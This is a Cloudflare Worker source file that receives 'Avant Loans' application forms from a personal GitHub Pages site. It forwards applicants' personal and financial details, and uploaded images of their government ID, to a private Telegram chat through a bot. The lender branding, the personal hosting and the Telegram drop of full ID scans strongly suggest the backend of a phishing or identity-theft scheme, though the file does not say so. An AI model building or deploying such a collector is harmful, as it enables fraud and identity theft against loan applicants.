/**
 * Cloudflare Worker: receives the Avant Loans application JSON from the
 * GitHub Pages site and forwards it to Telegram via the Bot API.
 *
 * Secrets (set with wrangler, NEVER commit them):
 *   wrangler secret put TELEGRAM_BOT_TOKEN   # from @BotFather
 *   wrangler secret put TELEGRAM_CHAT_ID     # numeric chat/user/group id
 * Plain var (wrangler.toml):
 *   ALLOWED_ORIGIN = "https://sittaluvv.github.io"
 *
 * Request: multipart/form-data with
 *   payload  = JSON string { source, submittedAt, summary, fields }
 *   id_front = ID file (required)   id_back = ID file (required unless fields["id-type"] === "Passport")
 * Files: JPG/PNG/PDF only (MIME + magic bytes checked), max 5 MB each. They are streamed to
 * Telegram (sendDocument) and never stored by this Worker (no KV/R2/cache).
 *
 * Deploy:
 *   cd server && npx wrangler deploy
 * Then rebuild the site with:
 *   VITE_TELEGRAM_API_URL=https://<worker>.workers.dev npm run build
 */

const CORS = (origin, allowed) => ({
  "Access-Control-Allow-Origin": origin && origin === allowed ? origin : "null",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
  "Access-Control-Max-Age": "86400",
  Vary: "Origin",
})

function formatTelegram(body) {
  if (typeof body.summary === "string" && body.summary.trim()) return body.summary.slice(0, 3900)
  const f = body.fields || {}
  const lines = [
    "Avant Middle East — new loan enquiry",
    ...(f.preferredContact ? [`Preferred contact: ${f.preferredContact}`] : []),
    `Submitted: ${body.submittedAt || new Date().toISOString()}`,
    "",
    "== Loan request ==",
    `Loan type: ${f["loan-type"] || ""}`,
    `Loan amount: ${f["loan-amount"] || ""}${f["loan-amount-usd"] ? ` (≈ ${f["loan-amount-usd"]})` : ""}`,
    `Loan duration: ${f["loan-duration"] || ""}`,
    "",
    "== Applicant ==",
    `Name: ${f["first-name"] || ""} ${f["last-name"] || ""}`.trim(),
    `Email: ${f.email || ""}`,
    `Birth date: ${f["birth-date"] || ""}`,
    `Marital: ${f.marital || ""}`,
    "",
    "== Address ==",
    [f.street, f["street-2"], f.city, f.region, f.postal, f.country].filter(Boolean).join(", "),
    "",
    "== Employment & income ==",
    [f.employment, f.employer && `at ${f.employer}`, f["job-title"] && `(${f["job-title"]})`, f["own-business-name"] && `business: ${f["own-business-name"]}`].filter(Boolean).join(" "),
    [f["years-employed"] && `Years with employer: ${f["years-employed"]}`, f["years-in-business"] && `Years in business: ${f["years-in-business"]}`, `Gross annual: ${f["annual-income"] || ""}`].filter(Boolean).join(" | "),
    `Other monthly: ${f["other-income"] || "0"} | Debts: ${f["monthly-debts"] || ""} | Pay: ${f["pay-frequency"] || ""}`,
    "",
    "== Loan details ==",
    `Purpose: ${f.purpose || ""}`,
    `Notes: ${f.notes || ""}`,
  ]
  return lines.join("\n").slice(0, 3900)
}

const MAX_FILE = 5 * 1024 * 1024
const KINDS = {
  "image/jpeg": { ext: "jpg", magic: (b) => b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff },
  "image/png": { ext: "png", magic: (b) => b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47 },
  "application/pdf": { ext: "pdf", magic: (b) => b[0] === 0x25 && b[1] === 0x50 && b[2] === 0x44 && b[3] === 0x46 },
}
const json = (obj, status, headers) => new Response(JSON.stringify(obj), { status, headers })

/** Validate an uploaded File; returns { kind, bytes } or { error }. */
async function checkFile(file, label) {
  if (!file || typeof file === "string") return { error: `${label} missing` }
  if (file.size === 0) return { error: `${label} is empty` }
  if (file.size > MAX_FILE) return { error: `${label} is larger than 5 MB` }
  const bytes = new Uint8Array(await file.arrayBuffer())
  // trust magic bytes over the client-declared type
  const type = Object.keys(KINDS).find((t) => KINDS[t].magic(bytes))
  if (!type) return { error: `${label} must be a JPG, PNG or PDF` }
  return { type, ext: KINDS[type].ext, bytes }
}

async function tgSendMessage(env, text) {
  const r = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text, disable_web_page_preview: true }),
  })
  const j = await r.json().catch(() => ({}))
  return r.ok && j.ok ? { ok: true, id: j.result.message_id } : { ok: false, detail: j.description || r.status }
}

async function tgSendDocument(env, file, filename, caption, replyTo) {
  const fd = new FormData()
  fd.append("chat_id", env.TELEGRAM_CHAT_ID)
  fd.append("document", new Blob([file.bytes], { type: file.type }), filename)
  fd.append("caption", caption.slice(0, 1000))
  if (replyTo) fd.append("reply_parameters", JSON.stringify({ message_id: replyTo, allow_sending_without_reply: true }))
  const r = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendDocument`, { method: "POST", body: fd })
  const j = await r.json().catch(() => ({}))
  return r.ok && j.ok ? { ok: true, id: j.result.message_id } : { ok: false, detail: j.description || r.status }
}

const clean = (s, n = 60) => String(s || "").replace(/[\r\n\t]+/g, " ").trim().slice(0, n)
const slug = (s) => clean(s, 40).replace(/[^A-Za-z0-9]+/g, "-").replace(/^-|-$/g, "") || "applicant"

export default {
  async fetch(request, env) {
    const allowed = env.ALLOWED_ORIGIN || "https://sittaluvv.github.io"
    const origin = request.headers.get("Origin") || ""
    const headers = { ...CORS(origin, allowed), "Content-Type": "application/json" }

    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers })

    // GET /geo -> { country } from Cloudflare's own edge geolocation (no third-party IP service).
    // Nothing is logged or stored; the response is per-visitor so it is never cached.
    if (request.method === "GET" && new URL(request.url).pathname === "/geo") {
      if (origin && origin !== allowed) return json({ error: "Origin not allowed" }, 403, headers)
      const country = typeof request.cf?.country === "string" ? request.cf.country : null
      return json({ country }, 200, { ...headers, "Cache-Control": "no-store, private" })
    }
    if (request.method !== "POST") return json({ error: "POST only" }, 405, headers)
    if (origin && origin !== allowed) return json({ error: "Origin not allowed" }, 403, headers)
    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) return json({ error: "Telegram secrets not configured" }, 503, headers)

    const ctype = request.headers.get("Content-Type") || ""
    if (!ctype.startsWith("multipart/form-data")) return json({ error: "ID documents required (multipart/form-data)" }, 400, headers)
    const len = Number(request.headers.get("Content-Length") || 0)
    if (len > 2 * MAX_FILE + 256 * 1024) return json({ error: "Upload too large" }, 413, headers)

    let form
    try { form = await request.formData() } catch { return json({ error: "Invalid form data" }, 400, headers) }
    let body
    try { body = JSON.parse(String(form.get("payload") || "")) } catch { return json({ error: "Invalid payload JSON" }, 400, headers) }
    if (!body || typeof body !== "object" || !body.fields) return json({ error: "Expected payload { fields, summary? }" }, 400, headers)

    const f = body.fields
    const idType = clean(f["id-type"], 80)
    if (!idType) return json({ error: "ID type missing" }, 400, headers)
    const front = await checkFile(form.get("id_front"), "ID front")
    if (front.error) return json({ error: front.error }, 400, headers)
    const backRaw = form.get("id_back")
    let back = null
    if (backRaw && typeof backRaw !== "string") {
      back = await checkFile(backRaw, "ID back")
      if (back.error) return json({ error: back.error }, 400, headers)
    } else if (idType !== "Passport") {
      return json({ error: "ID back missing" }, 400, headers)
    }

    const msg = await tgSendMessage(env, formatTelegram(body))
    if (!msg.ok) return json({ error: "Telegram rejected the message", detail: msg.detail }, 502, headers)

    const name = clean(`${f["first-name"] || ""} ${f["last-name"] || ""}`) || "Applicant"
    const docs = []
    for (const [side, file] of [["front", front], ["back", back]]) {
      if (!file) continue
      const label = idType === "Passport" && side === "front" ? "photo page" : side
      const caption = `ID ${label} — ${name} — ${idType}`
      const r = await tgSendDocument(env, file, `${slug(name)}-id-${side}.${file.ext}`, caption, msg.id)
      if (!r.ok) return json({ error: `Telegram rejected the ID ${side}`, detail: r.detail, message_id: msg.id }, 502, headers)
      docs.push(r.id)
    }
    return json({ ok: true, message_id: msg.id, document_ids: docs }, 200, headers)
  },
}
